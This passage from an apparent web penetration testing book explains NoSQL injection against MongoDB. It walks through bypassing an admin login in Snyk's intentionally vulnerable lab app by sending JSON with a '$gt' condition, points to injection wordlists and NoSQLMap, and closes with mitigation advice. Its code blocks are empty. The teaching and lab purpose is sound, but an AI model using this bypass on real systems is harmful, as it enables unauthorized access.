needs to be stored in some special kind of database, the so-called **Not only SQL** (**NoSQL**) databases such as MongoDB, CouchDB, Cassandra, and HBase.\n\nThe fact that the aforementioned database managers don't use SQL (or don't use SQL exclusively) doesn't mean that they are free from injection risk. Remember that the SQL injection vulnerability is caused by a lack of validation in the application sending the query, not in the DBMS processing it. The injection of code or altered parameters to queries of NoSQL databases is possible and not uncommon.\n\n# Testing for NoSQL injection\n\nNoSQL queries are usually done in JSON format. For example, a query in MongoDB may look like the following:\n\n```", "```\n\nTo inject code in an application using a MongoDB database, you need to take advantage of the JSON syntax using characters such as\u00a0`' \" ; { }` and form valid JSON structures.\n\n# Exploiting NoSQL injection\n\nTo test how an actual exploitation works, you can use a vulnerable application made by Snyk ([https://github.com/snyk/goof](https://github.com/snyk/goof)). To run this application, you need to have Node.js and MongoDB installed and properly running in your target server.\n\nYou should try an injection attack that bypasses the password check in the admin section. Having a proxy set up, browse to the admin section of your vulnerable application. In this example, it will be `http://10.0.2.2:3001/admin`. If you submit the user `admin` and any password, you can see that no access is given.\n\n![](img/00165.jpeg)\n\nIf you send that request to Repeater, you can see that it is sending two parameters: `username` and `password`. You should change the request format to JSON. To do that, you change the value of the `Content-Type` header and the format of the parameters:\n\n![](img/00166.jpeg)\n\nIf you submit that request, the server seems to accept it as no errors are generated. So for the sake of clarity, let's use the actual `admin` password in JSON format to be sure that it is actually accepted:\n\n![](img/00167.jpeg)\n\nNow that you know it works, try to inject a condition instead of a password value so that the verification is always true. The query will then say, \"If the username is `admin` and the password is greater than an empty string\":\n\n```", "```\n\n`$gt` is a special query operator for MongoDB that represents the greater than (`>`) binary operation. More operators and injection strings can be found at [https://github.com/cr0hn/nosqlinjection_wordlists](https://github.com/cr0hn/nosqlinjection_wordlists).\n\nNoSQLMap ([https://github.com/codingo/NoSQLMap.git](https://github.com/codingo/NoSQLMap.git)) is an open source tool that is not included in Kali Linux, but is easy to install. It can be used to automate NoSQL injection detection and exploitation.\n\n# Mitigation and prevention of injection vulnerabilities\n\nThe key aspect of preventing injection vulnerabilities is *validation*. The user-provided input should never be trusted and should always be validated and rejected or sanitized if it contains invalid or dangerous characters such as the following:\n\n*   Quotes (`'`\u00a0and\u00a0`\"`)\n*   Parentheses and brackets\n*   Reserved special characters (`'!'`, `'%'`, `'&'`, and\u00a0`';'`)\n*   Comments combinations (`'--'`, `'/*'`, `'*/'`, `'#'`, and\u00a0`'(:', ':)'`)\n*   Other characters specific to language and implementation\n\nThe recommended approach for validation is the **whitelist**. This means having a list of allowed characters for each input field or group of fields and comparing the submitted strings to that list. All characters in the submitted string must be in the allowed list for it to be validated.\n\nFor SQL injection prevention, parameterized or prepared statements should be used instead of concatenating inputs to query strings. The implementation of prepared statements varies from one language to another, but they all share the same principle; inputs provided by the client are not concatenated to the query string, instead they are sent as parameters to a function that properly builds the query. Here is an example for PHP:\n\n```"]